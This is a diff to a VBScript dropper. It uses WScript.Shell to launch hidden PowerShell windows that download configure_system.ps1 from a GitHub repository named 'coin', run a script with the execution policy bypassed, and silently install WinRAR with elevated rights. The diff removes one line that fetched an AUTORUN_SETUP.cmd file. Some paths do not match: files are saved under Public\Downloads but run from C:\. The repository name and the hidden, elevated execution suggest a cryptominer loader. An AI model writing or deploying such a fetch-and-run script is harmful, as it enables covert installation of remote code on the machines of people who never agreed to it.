@@ -1,6 +1,5 @@
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
-objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/AUTORUN_SETUP.cmd -OutFile C:\Users\Public\Downloads\AUTORUN_SETUP.cmd", 0, True
 objShell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\configure_system.ps1", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe -OutFile C:\Users\Public\Downloads\winrar-x64-701.exe", 0, True
 objShell.Run "powershell.exe -Command Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs", 0, True
